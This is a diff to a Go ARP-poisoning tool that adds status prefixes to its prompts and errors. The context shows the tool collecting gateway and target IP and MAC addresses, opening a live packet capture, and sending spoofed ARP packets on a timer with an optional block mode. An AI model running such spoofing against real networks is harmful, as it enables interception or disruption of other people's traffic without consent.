@@ -25,47 +25,47 @@ var (
 // Start initializes ARP poisoning and starts sending spoofed packets
 func pStart(interfaceName string) {
 	// User input for spoof and target information
-	fmt.Print("Enter the spoof IP (gateway IP): ")
+	fmt.Print("[?] Enter the spoof IP (gateway IP): ")
 	var spoofIPStr string
 	fmt.Scanln(&spoofIPStr)
 	if spoofIPStr == "h" || spoofIPStr == "home" {
-		fmt.Printf("\nExiting ARP Poisoning...")
+		fmt.Printf("\n[$] Exiting ARP Poisoning...")
 		return
 	}
 	spoofIP = net.ParseIP(spoofIPStr)
 
-	fmt.Print("Enter the target IP: ")
+	fmt.Print("[?] Enter the target IP: ")
 	var targetIPStr string
 	fmt.Scanln(&targetIPStr)
 	if targetIPStr == "h" || targetIPStr == "home" {
-		fmt.Printf("\nExiting ARP Poisoning...")
+		fmt.Printf("\n[$] Exiting ARP Poisoning...")
 		return
 	}
 	targetIP = net.ParseIP(targetIPStr)
 
-	fmt.Print("Enter the spoof MAC (gateway MAC): ")
+	fmt.Print("[?] Enter the spoof MAC (gateway MAC): ")
 	var spoofMACStr string
 	fmt.Scanln(&spoofMACStr)
 	if spoofMACStr == "h" || spoofMACStr == "home" {
-		fmt.Printf("\nExiting ARP Poisoning...")
+		fmt.Printf("\n[$] Exiting ARP Poisoning...")
 		return
 	}
 	spoofMAC, _ = net.ParseMAC(spoofMACStr)
 
-	fmt.Print("Enter the attacker MAC : ")
+	fmt.Print("[?] Enter the attacker MAC : ")
 	var attakerMACStr string
 	fmt.Scanln(&attakerMACStr)
 	if attakerMACStr == "h" || attakerMACStr == "home" {
-		fmt.Printf("\nExiting ARP Poisoning...")
+		fmt.Printf("\n[$] Exiting ARP Poisoning...")
 		return
 	}
 	attakerMAC, _ = net.ParseMAC(attakerMACStr)
 
-	fmt.Print("Enter the target MAC: ")
+	fmt.Print("[?] Enter the target MAC: ")
 	var targetMACStr string
 	fmt.Scanln(&targetMACStr)
 	if targetMACStr == "h" || targetMACStr == "home" {
-		fmt.Printf("\nExiting ARP Poisoning...")
+		fmt.Printf("\n[$] Exiting ARP Poisoning...")
 		return
 	}
 	targetMAC, _ = net.ParseMAC(targetMACStr)
@@ -74,14 +74,14 @@ func pStart(interfaceName string) {
 	var err error
 	handle, err = pcap.OpenLive(interfaceName, 1600, true, pcap.BlockForever)
 	if err != nil {
-		fmt.Printf("Error opening device %s: %v\n", interfaceName, err)
+		fmt.Printf("[!] Error opening device %s: %v\n", interfaceName, err)
 		return
 	}
 	defer handle.Close()
 
 	// Start spoofing in a goroutine
 	if err := sendARPSpoof(interfaceName); err != nil {
-		fmt.Printf("Error in sendARPSpoof: %v", err)
+		fmt.Printf("[!] Error in sendARPSpoof: %v", err)
 		return
 	}
 }
@@ -93,21 +93,21 @@ func sendARPSpoof(interfaceName string) error {
 
 	intervalTime := 2 * time.Second
 	// Prompt user for interval time
-	fmt.Print("Enter the interval time in seconds (press Enter for default 2): ")
+	fmt.Print("[?] Enter the interval time in seconds (press Enter for default 2): ")
 	var intervalTimeInput int
 	if _, err := fmt.Scanf("%d", &intervalTimeInput); err == nil {
 		intervalTime = time.Duration(intervalTimeInput) * time.Second
 	}
 
-	fmt.Print("Enter y/n for Block mode or not: ")
+	fmt.Print("[?] Enter y/n for Block mode or not: ")
 	var blokmod string
 	fmt.Scanln(&blokmod)
 	if blokmod == "h" || blokmod == "home" {
-		fmt.Printf("\nExiting ARP Poisoning...")
+		fmt.Printf("\n[$] Exiting ARP Poisoning...")
 		return nil
 	}
 
-	fmt.Printf("Starting ARP spoofing with interval %v\n", intervalTime)
+	fmt.Printf("[$] Starting ARP spoofing with interval %v\n", intervalTime)
 
 	ticker := time.NewTicker(intervalTime)
 	defer ticker.Stop()
@@ -158,7 +158,7 @@ func createARPPacket(op uint16, srcMAC net.HardwareAddr, srcIP net.IP, dstMAC ne
 	options := gopacket.SerializeOptions{}
 	err := gopacket.SerializeLayers(buffer, options, eth, arp)
 	if err != nil {
-		fmt.Printf("Error creating ARP packet: %v\n", err)
+		fmt.Printf("[!] Error creating ARP packet: %v\n", err)
 	}
 	return buffer.Bytes()
 }
